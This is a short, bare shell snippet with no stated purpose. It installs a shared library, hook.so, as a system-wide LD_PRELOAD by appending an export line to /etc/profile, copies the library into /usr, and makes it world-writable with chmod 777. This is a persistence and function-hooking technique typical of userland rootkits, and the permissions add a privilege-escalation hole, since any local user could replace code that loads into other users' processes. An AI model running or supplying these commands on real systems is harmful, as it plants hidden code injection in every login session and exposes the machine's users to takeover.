echo "export LD_PRELOAD=/usr/hook.so" >> /etc/profile
cp -f hook.so /usr/hook.so
chmod 777 /usr/hook.so